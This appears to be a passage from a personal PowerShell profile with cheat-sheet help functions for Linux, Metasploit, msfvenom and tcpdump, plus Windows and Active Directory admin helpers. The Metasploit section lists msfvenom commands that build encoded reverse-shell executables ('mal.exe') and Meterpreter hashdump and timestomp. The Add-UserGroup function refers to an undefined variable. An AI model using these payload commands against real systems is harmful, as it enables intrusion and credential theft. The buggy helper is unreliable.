    whgreen " - vi /etc/sysconfig/network-scripts/ifcfg-eth0                = Ruta configuración adaptadores de red "
    whgreen " - vi /etc/resolv.conf                                         = Verificar configuracion DNS " 
    whgreen " - nmcli -p dev                                                = Mostrar dispositivos " 
    whgreen " - nmcli con show                                              = Mostrar disposivos "
    whgreen " - nmcli con up static2                                        = Activar el dispositivo static2 "
    whgreen " - nmcli con down static2                                      = Deshablitar dispositivo static2 "
    whgreen ' - nmcli con mod static2 ipv4.dns "8.8.8.8 8.8.4.4"            = Modificar dns adaptador static2 '
    whgreen " - nmcli con mod static2 connection.permissions user:<users>   = Establecer permisos para usuarios "
    whgreen " - nmtui                                                       = NetworkManager's tool"
    whgreen ' - nmtui edit eth0                                             = Editar dispositvo de red eth0 ' 
    whred   " ejemplos: "
    whgreen " - nmcli con add type ethernet con-name static2 ifname enp0s3 ip4 192.168.1.50/24 gw4 192.168.1.1 "
    whgreen " - nmcli con add type ethernet con-name Myhome1 ifname enp0s3"
    whgreen "" 
    
    #
    Write-host -foregroundcolor red "SYSTEM INFO "
    whgreen " - hostnamectl                = Control the system hostname " 
    whgreen " - date                       = show current date/time " 
    whgreen " - cal                        = show moth's calendar " 
    whgreen " - uptime                     = show uptime host " 
    whgreen " - w                          = display who is online " 
    whgreen " - whoami                     = who are you logged in as " 
    whgreen " - uname -a                   = show kernel config "
    whgreen " - cat /proc/cpuinfo          = cpu info "
    whgreen " - cat /proc/meminfo          = mem info "
    whgreen " - man command                = show manual command "
    whgreen " - df                         = show disk usage "
    whgreen " - du                         = show directory space use " 
    whgreen " - du -sh                     = human readeable size in GB " 
    whgreen " - du -s * | sort -n| tail    = get 10 biggest files "
    whgreen " - free                       = show memory and swap usage " 
    whgreen " - whereis app                = show posible locations of app " 
    whgreen " - which app                  = show which app will be run by default "
    whgreen " - rpm -qa                    = show installed programs "
    whgreen ""
    #
    Write-host -foregroundcolor red "SEARCHING "
    whgreen " - grep pattern files                                                           = search for pattern in files " 
    whgreen " - grep -r pattern dir                                                          = search recursively for pattern in dir " 
    whgreen " - command | grep pattern                                                       = search for pattern in the command output " 
    whgreen " - locate file                                                                  = find all instances of file " 
    whgreen " - find / -name foo.bar -print                                                  = Find a file that exists somewhere in the filesystem "  
    whgreen " - find / -name foo.bar -print -xdev                                            = Find a file without searching network or mounted filesystems "
    whgreen " - find / -name foo.bar -print 2>/dev/null                                      = Find a file without showing 'Permission Denied' messages" 
    whgreen " - find . -name *.bar -maxdepth 2 -print                                        = Find a file, who's name ends with .bar, within the current directory and only search 2 directories deep" 
    whgreen " - find ./dir1 ./dir2 -name foo.bar -print                                      = Search directories './dir1' and './dir2' for a file 'foo.bar'" 
    whgreen " - find /some/directory -user joebob -print                                     = Search for files that are owned by the user 'joebob' "
    whgreen " - find /some/directory -type l -print                                          = Find a file that is a certain type. '-type l' searches for symbolic links "
    whgreen " - find . -name '*foo*' ! -name '*.bar' -type d -print                          = Search for directories that contain the phrase 'foo' but do not end in '.bar' " 
    whgreen " - find ~/documents -type f -name '*.txt' \-exec grep -s 'pattern' {} \; -print = Find becomes extremely useful when combined with other commands" 
    whgreen ""  
    #
    Write-host -foregroundcolor red "PROCESS MANAGEMENT "
    whgreen " - ps                     = display currently active process " 
    whgreen " - ps aux                 = ps with a lot of detail " 
    whgreen " - ps aux | grep -i java  = ps search pattern 'java' "
    whgreen " - kill pid               = kill process with 'pid' " 
    whgreen " - killall proc           = kill a processes named proc " 
    whgreen " - bg                     = list stopped/background jobs, resume stopped jobs in bg " 
    whgreen " - fg                     = bring most recent job to foreground " 
    whgreen " - fg n                   = brings job n to foreground "
    whgreen ""
    Write-host -foregroundcolor red "TIME & ZONE "
    whgreen " - ln -sf /usr/share/zoneinfo/Europe/Madrid /etc/localtime  = link to localtime zone"
    whgreen ' - ntpdate "server name" && hwclock -w                      = use NTP update clock & hwclock' 
    whgreen ' - ntpdate "server DNS name or IP address"                  = use NTP update clock ' 
    whgreen ' - hwclock --show                                           = show hardware clock ' 
    whgreen ' - hwclock --utc --systohc                                  = hardware clock update UTC ' 
    whgreen ""
    #
    Write-host -foregroundcolor red "FILE PERMISSONS "
    whgreen " chmod octal file " 
    whgreen " - 4 read (r)  " 
    whgreen " - 2 write (w) " 
    whgreen " - 1 execute (x) " 
    whred   " order: owner/group/world " 
    whgreen " - chmod 777 - rwx for everyone " 
    whgreen " - chmod 755 - rw for owner, rx for group/world "
    whgreen " - chmod --reference file1 file2     = copy file1 permissions" 
    whgreen "" 
    #
    Write-host -foregroundcolor red "COMPRESSION "
    whgreen " - tar cvf file.tar files                              = tar files into file.tar "
    whgreen " - tar rvf sampleArchive.tar example.jpg               = add file to tar "
    whgreen " - tar xvf file.tar                                    = untar in current directory "
    whgreen " - tar xvf file.tar file.sh                            = untar only one or multiple files "
    whgreen " - tar xvf file.tar -C /home/Extract                   = untar specific directory "
    whgreen " - tar -zxvf sampleArchive.tar.gz --wildcards '*.jpg'  = untar used a wilcard "   
    whgreen " - tar tvf file.tar                                    = show contents of archive " 
    whgreen " - tar -czf - sampleArchive.tar | wc -c                = verify size "
    whgreen ""
    whred   "tar flags: " 
    whgreen " - c - create archive              j - bzip2 compression " 
    whgreen " - t - table of content            k - do not overwrite "
    whgreen " - x - extract                     T - files from file " 
    whgreen " - f - specifies filename          w - ask for confirmation " 
    whgreen " - z - use zip/gzip                v - verbose " 
    whgreen ""
    whred   "gzip: " 
    whgreen " - gzip file                   = compress file and rename to file.gz " 
    whgreen " - gzip -d file.gz             = decompress file.gz "
    whgreen " - gzip -l file.gz             = show info " 
    whgreen ""
    #
    Write-host -foregroundcolor red "USERS & GROUPS "
    whgreen " - adduser user             = add user friendly method "
    whgreen " - useradd user -m          = "
    whgreen " - useradd user -g group    = add user specific group "
    whgreen " - rmuser                   = remove user "
    whgreen " - userdel                  = remove user "
    whgreen ""
    whgreen ""

    Write-host -foregroundcolor red "COMMAND LINE FU "
    whgreen " - time read                 " 
    whgreen " - man ascii                 " 
    whgreen ' - echo "!!" > foo.sh        ' 
    whgreen " - curl ifconfig.me          " 
    whgreen " - pushd /tmp                "
    whgreen " - !*                        "
    whgreen " - netstat -tlnp             " 
    whgreen " - <space>command            "
    whgreen " - net rpc shutdown -I ipAddressOfWindowsPC -U username password" 
    whgreen " - ps aux | sort -nk +4 | tail"
    whgreen " - ctrl-l" 
    whgreen " - ssh -t reachable_host ssh unreachable_host "
    whgreen "" 
    #

}Set-Alias ayudalinux Linux-Commands


# MSF
# MSF
function Msf-Help
{
    whdarkYellow ""
    whred        "METASPLOIT "
    whyellow     " https://www.offensive-security.com/metasploit-unleashed/introduction/ "
    whred        "Useful Auxiliary Modules "
    whyellow     "Port Scanner: "
    whdarkYellow " - use auxiliary/scanner/portscan/tcp "
    whdarkYellow " - set RHOSTS 10.10.10.0/24 "
    whdarkYellow " - run "
    whyellow     "DNS Enumeration "
    whdarkYellow " - use auxiliary/gather/dns_enum "
    whdarkYellow " - set DOMAIN target.tgt "
    whdarkYellow " - run"
    whyellow     "FTP Server "
    whdarkYellow " - use auxiliary/server/ftp  "
    whdarkYellow " - set FTPROOT /tmp/ftproot"
    whdarkYellow " - run "
    whYellow     "Proxy Server "
    whdarkYellow " - use auxiliary/server/socks4 "
    whdarkYellow " - run "
    whyellow     "Metasploit Console Basics (msfconsole) "
    whdarkYellow " - search [regex]  "
    whyellow     "Specify and exploit to use: "
    whdarkYellow " - use exploit/[ExploitPath] "
    whdarkYellow "Specify a Payload to use: "
    whdarkYellow " - set PAYLOAD [PayloadPath] "
    whyellow     "Show options for the current modules: "
    whdarkYellow " - show options "
    whyellow     "Set Options "
    whdarkYellow " - set [Option] [Value]: "
    whyellow     "Start exploit "
    whdarkYellow " - exploit "
    whdarkYellow ""
    whyellow     "Metasploit Meterpreter "
    whyellow     "Base Commands:  "
    whdarkYellow " - ? / help: Display a summary of commands "
    whdarkYellow " - exit / quit: Exit the Meterpreter session "
    whdarkYellow " - sysinfo: Show the system name and OS type "
    whdarkYellow " - shutdown / reboot: Self-explanatory "
    whdarkYellow " - File System Commands: "
    whdarkYellow " - cd: Change directory "
    whdarkYellow " - lcd: Change directory on local (attacker's) machine "
    whdarkYellow " - pwd / getwd: Display current working directory  "
    whdarkYellow " - ls: Show the contents of the directory "
    whdarkYellow " - cat: Display the contents of a file on screen "
    whdarkYellow " - download / upload: Move files to/from the target machine "
    whdarkYellow " - mkdir / rmdir: Make / remove directory "
    whdarkYellow " - edit: Open a file in the default editor (typically vi) "
    whdarkYellow ""
    whyellow     "Metasploit Meterpreter (contd) "
    whdarkYellow " - getpid: Display the process ID that Meterpreter is running inside "
    whdarkYellow " - ps: Display process list "
    whdarkYellow " - kill: Terminate a process given its process ID "
    whdarkYellow " - execute: Run a given program with the privileges of the process the Meterpreter is loaded in "
    whdarkYellow " - migrate: `
            - Jump to a given destination process ID `
            - Target process must have same or lesser privileges ` 
            - Target process may be a more stable process
            - When inside a process, can access any files that process has a lock on "
    whyellow     "Network Commands: "
    whdarkYellow " - ipconfig: Show network interface information  "
    whdarkYellow " - portfwd: Forward packets through TCP session "
    whdarkYellow " - route: Manage/view the system's routing table "
    whyellow     "Misc Commands: "
    whdarkYellow " - idletime: Display the duration that the GUI of the target machine has been idle "
    whdarkYellow " - uictl [enable/disable] [keyboard/mouse]: Enable/disable either the mouse orkeyboard of the target machine  "
    whdarkYellow " - screenshot: Save as an image a screenshot of the target machine "
    whdarkYellow "Additional Modules: "
    whdarkYellow " - use [module]: Load the specified module "
    whdarkYellow " - Example: "
    whdarkYellow " - use priv: Load the priv module "
    whdarkYellow " - hashdump: Dump the hashes from the box  "
    whdarkYellow " - timestomp:Alter NTFS file timestamps  "
    whyellow     "Managing Sessions "
    whdarkYellow "Multiple Exploitation: "
    whdarkYellow " - exploit -z   = Exploit expecting a single session that is immediately backgrounded "
    whdarkYellow " - exploit –j   = Run the exploit immediately in the background "
    whdarkYellow " - jobs –l      = List all current jobs (usually exploit listeners):  "
    whyellow     "Multiple Sessions "
    whdarkYellow " - sessions -l              = List all backgrounded sessions "
    whdarkYellow " - session -i [SessionID]   = Interact with a backgrounded session "
    whyellow     "Background the current interactive session: "
    whdarkYellow " - <Ctrl+Z> "
    whdarkYellow " - background "
    whyellow     "Routing Through Sessions: "
    whdarkYellow " - route add [Subnet to Route To] [Subnet Netmask] [SessionID]  "
    whdarkYellow ""
    whred        "MSFVENOM "
    whdarkYellow " - msfvenom -l payloads  =  show payloads "
    whdarkYellow " - msfvenom –p [PayloadPath] –f [FormatType] LHOST=[LocalHost (if reverse conn.)] LPORT=[LocalPort]  "
    whyellow     "Example: "
    whdarkYellow " - msfvenom -p windows/meterpreter/ reverse_tcp -f exe LHOST=10.1.1.1 LPORT=4444 > met.exe   "
    whyellow     "Format Options (specified with –f) "
    whyellow     "Format Options (specified with –f) "
    whdarkYellow " --help-formats  = help commands "
    whdarkYellow " exe – Executable"
    whdarkYellow " pl  – Perl"
    whdarkYellow " rb  – Ruby"
    whdarkYellow " raw – Raw shellcode"
    whdarkYellow " c   – C code "
    whyellow     "Encoding Payloads with msfvenom "
    whdarkYellow " - msfvenom -l encoders   = show encoders "
    whdarkYellow " - msfvenom -p [Payload] -e [Encoder] -f [FormatType] -i [EncodeInterations] LHOST=[LocalHost (if reverse conn.)] LPORT=[LocalPort] "
    whyellow     "Example "
    whdarkYellow " - msfvenom -p windows/meterpreter/reverse_tcp -i 5 -e x86/shikata_ga_nai -f exe LHOST=10.1.1.1 LPORT=4444 > mal.exe  "
    whdarkYellow ""
    whred        "searchsploit "
    whdarkYellow " - searchsploit -u                                  = update "
    whdarkYellow " - searchsploit -h                                  = help "
    whdarkYellow " - searchsploit afd windows local                   = Basic Search"
    whdarkYellow " - searchsploit -t oracle windows                   = Title Search "
    whdarkYellow " - searchsploit -m 39446 win_x86-64/local/39525.py  = Copy to folder "
    whdarkYellow " - searchsploit WarFTP 1.65 -w                      = ExploirDB Online "
    whdarkYellow ""

}
Set-Alias ayudamsf Msf-Help
Set-Alias amsf Msf-Help

# tcpdump
function Help-TcpDump 
{
  
    whdarkgray ""
    whdarkgray " - tcpdump -D                                            = Ver listado de intefaces "
    whdarkgray " - tcpdump -i eth0 -w trafico.log                        = Capturar trafico y enviar a un fichero "
    whdarkgray " - tcpdump -i eth0 (udp|tcp|icmp)                        = Capturar por protocolo "
    whdarkgray " - tcpdump -i eth0 tcp port 80                           = Capturar por puerto "
    whdarkgray " - tcpdump -i eth0 tcp port 80 and src 192.168.1.100     = Capturar por puerto 80, filtro por IP origen "
    whdarkgray " - tcpdump -i eth0 tcp port 80 and dst 192.168.1.100     = Capturar por puerto 80, filtro por IP destino "
    whdarkgray " - tcpdump -i eth0 -A                                    = Mostrar contenido de los paquetes en formato ASCII "
    whdarkgray " - tcpdump -i eth0 -XX                                   = Capturar paquetes en hexadecimal y ASCII "
    whdarkgray " - tcpdump -i eth0 not icmp                              = Capturar todo el trafico excepto ciertas condiciones "
    whdarkgray " - tcpdump -i eth0 not icmp and not tcp                  = Capturar todo el trafico excepto ciertas condiciones "
    whdarkgray " - tcpdump -i eth0 -v | -vv                              = Informacion extendida (verbose) "
    whdarkgray " - tcpdump -r archivo.log                                = Leer captura de trafico almacenada en un archivo" 
    whdarkgray "Ejemplos: "
    whdarkgray " - tcpdump 'dst 192.168.1.100 and (port http or https)' "  
    whdarkgray " - tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet' "
    whdarkgray ""
  
}
Set-Alias ayudatcpdump Help-TcpDump
Set-Alias atcpdump ayudatcpdump



# FUNCIONES 

# funcion ver servicio
function systemctl($name)
{  
    Get-Service -DisplayName *$name*
}



# Chocolatey profile
$ChocolateyProfile = "$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"
if (Test-Path($ChocolateyProfile)) {
Import-Module "$ChocolateyProfile"}



# Elevated PSSession (alias 'eleva')
function Enter-AdminPSSession {
  if ($env:OS -eq 'Windows_NT') {
    Start-Process -Verb RunAs (Get-Process -Id $PID).Path
  } else {
    sudo (Get-Process -Id $PID).Path
  }
} 


# GEOlocalizar IP
function GEOLocalize {
      Param
      ([string]$IPAddress)
     
      $request = Invoke-RestMethod -Method Get -Uri "http://ip-api.com/json/$IPAddress"
     
      [PSCustomObject]@{
        IP      = $request.query
        City    = $request.city
        Country = $request.country
        Isp     = $request.isp
      }
}


# Ping rango
function PingRange
{
<#

.SYNOPSIS
  Powershell script to ping all IP addresses in a range.
  
.DESCRIPTION
  This PowerShell script send pings all the IP addresses.
  
.PARAMETER 
   IP range address (example 192.168.1) 
 
.NOTES
  Version:        1.0
  Author:         Victor Gil
  Creation Date:  03-May-2019
 
.LINK
    -
    
.EXAMPLE
  PingRango 192.168.1
   
#>

Param($Range)
    
1..254 | ForEach-Object {Get-WmiObject Win32_PingStatus -Filter "Address='$Range.$_' and Timeout=200 and ResolveAddressNames='true' and StatusCode=0" | select ProtocolAddress*}
}


# IP Publica
Function PublicIP
{
<#

.SYNOPSIS
  
  
.DESCRIPTION

  
.PARAMETER 

 
.NOTES
  Version:        1.0
  Author:         Victor Gil
  Creation Date:  16-Ene-2020
 
.LINK
    -
    
.EXAMPLE
  IpPublica
   
#>
    
Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content)
}


# Conectar PC remoto
Function ConectRPC
{
    param($RemotePC)
    $cred = Get-Credential
    Enter-PSSession -ComputerName $RemotePC -Credential $cred

}


# WMI OBJECT
function Get-WMIClass
{

<#

.SYNOPSIS

  
.DESCRIPTION
  
  
.PARAMETER 
   
 
.NOTES
  Version:        1.0
  Author:         Victor Gil
  Creation Date:  16-Ene-2020
 
.LINK
    -
    
.EXAMPLE
  ClaseWMI -filter dns
   
#>

Param($filter)
  
   Get-WmiObject -List | where {$_.name -Match "$filter"}

}


# Usuario logeado en host remoto
function Get-LoguedUser
{

param($computer)
    
   
    (Get-WmiObject -Class win32_process -ComputerName $computer | Where-Object name -Match explorer).getowner().user
    
}


# Ultimo logueo en equipo
function Get-LastLogon
{

param($computer)

    $path = "\\$computer\c$\Users"
    # Get-WinEvent  -Computer $computer -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 10 | select @{N='User';E={$_.Properties[1].Value}}
    Get-ChildItem -Path $path  |  sort LastWriteTime -Descending
}


# Crear servicios
function Create-Service
{
    Param($ServiceName,$PathBin)

    New-Service -Name "$ServiceName" -BinaryPathName "$PathBin"

}


#### AD TOOLS

function Get-GroupUserMemberOf {
      Param
      (
        [string]$user
      )
     Get-ADUser $user -Properties Memberof | select -ExpandProperty memberof
      
}



function Get-GroupUserName {
      Param
      (
        [string]$user
      )
     Get-ADPrincipalGroupMembership $user | select name
      
}


## Add user to group
function Add-UserGroup {
      Param
      (
        [string]$group,
        [string]$user
      )
     Add-LocalGroupMember -Group $group -Member $member
      
}

# LAPS
function LAPS
{

param($computerName)

#$computer = Read-Host "EQUIPO"
Get-AdmPWDPassword -ComputerName "$computerName" 

}



# Alias
Set-Alias -Name eleva -Value Enter-AdminPSSession
Set-Alias -Name grep -Value Select-String
Set-Alias -Name list -Value Get-ChildItem
Set-Alias -Name ll -Value ls
Set-Alias -Name open -Value explorer.exe
Set-Alias -Name gui -Value Out-GridView
